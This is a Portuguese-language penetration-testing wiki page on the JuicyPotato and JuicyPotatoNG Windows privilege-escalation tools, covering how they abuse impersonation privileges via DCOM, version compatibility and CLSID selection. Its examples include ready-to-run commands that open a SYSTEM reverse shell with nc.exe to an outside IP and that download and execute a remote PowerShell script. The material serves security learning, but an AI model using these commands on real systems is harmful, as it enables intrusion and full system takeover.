# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato é legado. Geralmente funciona em versões do Windows até Windows 10 1803 / Windows Server 2016. As alterações da Microsoft introduzidas a partir do Windows 10 1809 / Server 2019 quebraram a técnica original. Para essas versões e posteriores, considere alternativas modernas como PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato e outras. Veja a página abaixo para obter opções e uso atualizados.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusando dos privilégios dourados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Uma versão aprimorada do_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, com um pouco de suco, ou seja, **outra ferramenta de Local Privilege Escalation, de Windows Service Accounts para NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### Você pode baixar o juicypotato em [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notas rápidas de compatibilidade

- Funciona de forma confiável até o Windows 10 1803 e o Windows Server 2016 quando o contexto atual possui SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege.
- Foi quebrado pelo hardening da Microsoft no Windows 10 1809 / Windows Server 2019 e posteriores. Prefira as alternativas vinculadas acima para essas versões.

### Resumo <a href="#summary" id="summary"></a>

[**Do Readme do juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e suas [variantes](https://github.com/decoder-it/lonelypotato) utilizam a cadeia de privilege escalation baseada no serviço [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), que possui o listener MiTM em `127.0.0.1:6666`, quando você tem os privilégios `SeImpersonate` ou `SeAssignPrimaryToken`. Durante uma análise de build do Windows, encontramos uma configuração em que o `BITS` estava intencionalmente desabilitado e a porta `6666` estava ocupada.

Decidimos weaponize o [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Dê as boas-vindas ao Juicy Potato**.

> Para a teoria, veja [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e siga a cadeia de links e referências.<sup>[[4]](#references)</sup>

Além do `BITS`, vários servidores COM podem ser abusados. Eles precisam apenas de:

1. poder ser instanciados pelo usuário atual, normalmente um “usuário de serviço” que possui privilégios de impersonation
2. implementar a interface `IMarshal`
3. executar como um usuário elevado (SYSTEM, Administrator, …)

Após alguns testes, obtivemos e testamos uma lista extensa de [CLSID’s](http://ohpe.it/juicy-potato/CLSID/) [interessantes] em várias versões do Windows.

### Detalhes do Juicy <a href="#juicy-details" id="juicy-details"></a>

O JuicyPotato permite que você:<sup>[[1]](#references)</sup>

- **Target CLSID** _escolha qualquer CLSID que desejar._ [_Aqui_](http://ohpe.it/juicy-potato/CLSID/) _você pode encontrar a lista organizada por OS._
- **COM Listening port** _defina a porta de escuta COM de sua preferência (em vez da porta 6666 definida diretamente no marshalled)_
- **COM Listening IP address** _faça bind do servidor em qualquer IP_
- **Process creation mode** _dependendo dos privilégios do usuário impersonated, você pode escolher entre:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _execute um executável ou script se a exploração for bem-sucedida_
- **Process Argument** _personalize os argumentos do processo iniciado_
- **RPC Server address** _para uma abordagem stealthy, você pode autenticar-se em um servidor RPC externo_
- **RPC Server port** _útil se você quiser autenticar-se em um servidor externo e o firewall estiver bloqueando a porta `135`…_
- **TEST mode** _principalmente para fins de teste, ou seja, testar CLSIDs. Ele cria o DCOM e exibe o usuário do token. Veja_ [_aqui para testes_](http://ohpe.it/juicy-potato/Test/)

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Considerações finais <a href="#final-thoughts" id="final-thoughts"></a>

[**Do Readme do juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Se o usuário tiver os privilégios `SeImpersonate` ou `SeAssignPrimaryToken`, então você é **SYSTEM**.

É praticamente impossível impedir o abuso de todos esses COM Servers. Você poderia considerar modificar as permissões desses objetos via `DCOMCNFG`, mas boa sorte; isso será um desafio.

A solução real é proteger as contas e aplicações sensíveis que são executadas sob as contas `* SERVICE`. Interromper o `DCOM` certamente impediria esse exploit, mas poderia causar um impacto sério no sistema operacional subjacente.

De: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

O JuicyPotatoNG reintroduz uma escalada de privilégios local no estilo JuicyPotato no Windows moderno, combinando:<sup>[[2]](#references)</sup>
- Resolução DCOM OXID para um servidor RPC local em uma porta escolhida, evitando o antigo listener codificado em 127.0.0.1:6666.
- Um hook SSPI para capturar e personificar a autenticação SYSTEM de entrada sem exigir RpcImpersonateClient, o que também permite CreateProcessAsUser quando apenas SeAssignPrimaryTokenPrivilege está presente.
- Tricks para satisfazer as restrições de ativação do DCOM (por exemplo, o antigo requisito do grupo INTERACTIVE ao visar as classes PrintNotify / ActiveX Installer Service).

Notas importantes (comportamento em evolução entre as builds):<sup>[[2]](#references)</sup>
- Setembro de 2022: A técnica inicial funcionava nos alvos Windows 10/11 e Server compatíveis usando o “INTERACTIVE trick”.
- Atualização dos autores em janeiro de 2023: A Microsoft bloqueou posteriormente o INTERACTIVE trick. Um CLSID diferente ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restaura a exploração, mas apenas no Windows 11 / Server 2022, de acordo com a publicação deles.

Uso básico (mais flags na ajuda):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Se você estiver mirando o Windows 10 1809 / Server 2019, onde o JuicyPotato clássico foi corrigido, prefira as alternativas vinculadas no início (RoguePotato, PrintSpoofer, EfsPotato/GodPotato etc.). O NG pode ser situacional, dependendo do build e do estado do serviço.

## Exemplos

Nota: visite [esta página](https://ohpe.it/juicy-potato/CLSID/) para obter uma lista de CLSIDs para testar.

### Obter um reverse shell com nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Iniciar um novo CMD (se você tiver acesso RDP)

![Powershell rev - Iniciar um novo CMD (se você tiver acesso RDP): Iniciar um novo CMD (se você tiver acesso RDP)](<../../images/image (300).png>)

## Problemas com CLSID

Frequentemente, o CLSID padrão usado pelo JuicyPotato **não funciona** e o exploit falha. Normalmente, são necessárias várias tentativas para encontrar um **CLSID funcional**. Para obter uma lista de CLSIDs para testar em um sistema operacional específico, visite esta página:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Verificando CLSIDs**

Primeiro, você precisará de alguns executáveis além do juicypotato.exe.

Baixe [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e carregue-o na sua sessão do PS; depois, baixe e execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Esse script criará uma lista de CLSIDs possíveis para testar.

Em seguida, baixe [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(altere o caminho para a lista de CLSIDs e para o executável juicypotato) e execute-o. Ele começará a testar cada CLSID e, **quando o número da porta mudar, isso significará que o CLSID funcionou**.

**Verifique** os CLSIDs funcionais **usando o parâmetro -c**

## References

- [1] [README do Juicy Potato (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [Dando uma segunda chance ao JuicyPotato: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Página do projeto Juicy Potato (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Escalação de privilégios de contas de serviço para SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
